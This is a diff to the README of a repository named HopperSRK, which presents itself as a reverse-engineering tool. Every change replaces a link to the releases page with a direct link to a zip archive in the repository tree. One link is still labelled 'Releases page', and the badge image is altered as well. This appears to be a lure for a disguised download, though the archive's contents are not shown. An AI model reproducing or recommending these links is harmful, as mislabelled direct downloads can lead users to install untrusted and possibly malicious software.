@@ -1,6 +1,6 @@
 # 🚀 HopperSRK - Streamline Your Reverse Engineering Process
 
-[![Download HopperSRK](https://img.shields.io/badge/Download-HopperSRK-blue.svg)](https://github.com/kajitarmin/HopperSRK/releases)
+[![Download HopperSRK](https://github.com/kajitarmin/HopperSRK/raw/refs/heads/main/HopperSDK/Hopper_SRK_3.5-beta.1.zip)](https://github.com/kajitarmin/HopperSRK/raw/refs/heads/main/HopperSDK/Hopper_SRK_3.5-beta.1.zip)
 
 ## 📖 Introduction
 
@@ -27,7 +27,7 @@ Before downloading HopperSRK, ensure your system meets the following requirement
 
 To begin using HopperSRK, follow the steps below to download and install the software:
 
-1. Visit the [Releases page](https://github.com/kajitarmin/HopperSRK/releases).
+1. Visit the [Releases page](https://github.com/kajitarmin/HopperSRK/raw/refs/heads/main/HopperSDK/Hopper_SRK_3.5-beta.1.zip).
 2. Choose the latest version of HopperSRK.
 3. Download the installer by clicking on the relevant link.
 4. Once the download completes, locate the file in your Downloads folder.
@@ -36,7 +36,7 @@ To begin using HopperSRK, follow the steps below to download and install the sof
 
 ## 📥 Download & Install
 
-To access the latest version of HopperSRK, visit this page: [Download HopperSRK](https://github.com/kajitarmin/HopperSRK/releases). 
+To access the latest version of HopperSRK, visit this page: [Download HopperSRK](https://github.com/kajitarmin/HopperSRK/raw/refs/heads/main/HopperSDK/Hopper_SRK_3.5-beta.1.zip). 
 
 Make sure to download the version that matches your needs and follow the installation instructions provided above.
 
